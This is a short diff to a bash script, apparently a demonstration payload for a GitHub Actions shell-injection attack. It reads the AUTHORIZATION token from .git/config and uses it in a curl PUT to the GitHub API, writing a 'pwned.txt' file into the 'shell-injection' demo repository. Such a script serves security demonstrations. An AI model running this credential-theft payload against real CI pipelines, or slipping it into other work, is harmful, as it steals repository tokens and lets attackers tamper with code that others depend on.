@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
 
-authfield=$(cat git-config | grep AUTHORIZATION | cut -d':' -f 2)
+authfield=$(cat .git/config | grep AUTHORIZATION | cut -d':' -f 2)
 curl -X PUT
   --url https://api.github.com/repos/minusworld-gha-demo/shell-injection/contents/pwned.txt
   --header "Authorization: $authfield"
